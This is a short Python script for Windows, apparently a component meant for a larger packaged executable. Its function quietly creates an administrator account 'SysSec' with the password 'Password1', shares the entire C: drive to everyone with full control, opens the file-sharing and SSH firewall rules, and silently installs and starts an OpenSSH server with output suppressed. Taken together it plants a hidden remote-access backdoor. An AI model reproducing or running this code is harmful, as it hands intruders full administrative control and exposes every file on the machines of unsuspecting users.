import os
import subprocess

## this is done just need OPenSSH-Win64 folder in the root exe folder

##ADD  ALL THESE NEW VARS TO FINAL
install_openssh = 'powershell.exe -ExecutionPolicy Bypass -File C:\OpenSSH-Win64\install-sshd.ps1'
firewall_rule_name = "'SSH Security'"
firewall_rule_ssh = '"New-NetFirewallRule -Name sshd -DisplayName {} -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22"'.format(firewall_rule_name)
enable_file_sharing = 'netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes'
ssh_service1 = '"Set-Service sshd -StartupType Automatic"'
ssh_service2 = '"Set-Service ssh-agent -StartupType Automatic"'
## adds user with the name of securitysys
## Password password1
#Eq;CaXxFX-.Y.)sg8nM.w?AMlBiy@*i@
#Administrator


#copy func
def Share_USER_SSH():
    os.system('net user /add SysSec Password1')
    os.system('net localgroup administrators SysSec /add')
    os.system('{}'.format(enable_file_sharing))
    os.system('net share AdminS=C:\ /grant:everyone,Full')
    os.system('@echo off && robocopy /E ./OpenSSH-Win64 C:\OpenSSH-Win64\ /NFL /NDL /NJH /NJS /nc /ns /np >nul 2>&1')
    os.system('{}'.format(install_openssh))
    os.system('@echo off && powershell.exe -command {} >nul 2>&1'.format(ssh_service1))
    os.system('@echo off && powershell.exe -command {} >nul 2>&1'.format(ssh_service2))
    os.system('@echo off && powershell.exe -command {} >nul 2>&1'.format(firewall_rule_ssh))
    os.system('net start sshd')



